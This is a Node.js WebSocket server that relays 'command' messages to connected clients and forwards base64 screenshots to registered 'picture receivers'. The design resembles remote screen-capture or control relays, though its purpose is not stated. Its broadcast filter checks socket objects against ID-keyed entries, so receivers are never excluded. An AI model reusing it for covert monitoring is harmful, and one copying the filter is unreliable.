const http = require("http");
const express = require("express");
const WebSocket = require("ws");
const app = express();

app.use(express.static("public"));

const PORT = process.env.PORT || 3000;
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

const usersInChat = new Map();
const pictureReceivers = new Map();
let keepAliveId;

wss.on("connection", function (ws) {
    const userID = generateUniqueID();
    
    ws.on("message", data => handleMessage(ws, data, userID));
    
    ws.on("close", () => {
        handleDisconnect(userID);
        ws.removeAllListeners();
    });
    
    if (wss.clients.size === 1 && !keepAliveId) {
        keepServerAlive();
    }
});

wss.on("close", () => {
    clearInterval(keepAliveId);
    keepAliveId = null;
});

function generateUniqueID() {
    return Math.random().toString(36).substr(2, 9);
}

function handleMessage(ws, data, userID) {
    try {
        const messageData = JSON.parse(data);
        
        switch(messageData.type) {
            case 'command':
                if (messageData.command === 'Picture Receiver') {
                    pictureReceivers.set(userID, ws);
                }
                break;
            case 'screenshot':
                if (messageData.data.startsWith('data:image/png;base64')) {
                    broadcastToPictureReceivers(messageData);
                }
                break;
            case 'screenshot_result':
                broadcastToPictureReceivers(messageData);
                break;
            default:
                broadcastToAllExceptPictureReceivers(ws, JSON.stringify(messageData), true);
        }
    } catch (e) {
        console.error('Error parsing data:', e);
    }
}

function broadcastToPictureReceivers(message) {
    const data = JSON.stringify(message);
    for (const [, ws] of pictureReceivers) {
        if (ws.readyState === WebSocket.OPEN) {
            ws.send(data, error => {
                if (error) console.error("Error sending message to receiver:", error);
            });
        }
    }
}

function broadcastToAllExceptPictureReceivers(senderWs, message, includeSelf) {
    wss.clients.forEach(client => {
        if (!pictureReceivers.has(client) && client.readyState === WebSocket.OPEN && (includeSelf || client !== senderWs)) {
            client.send(message);
        }
    });
}

function handleDisconnect(userID) {
    usersInChat.delete(userID);
    pictureReceivers.delete(userID);
}

function keepServerAlive() {
    keepAliveId = setInterval(() => {
        wss.clients.forEach(client => {
            if (client.readyState === WebSocket.OPEN) {
                client.ping();
            }
        });
    }, 30000);
}

server.listen(PORT, () => console.log(`Server is running on port ${PORT}`));
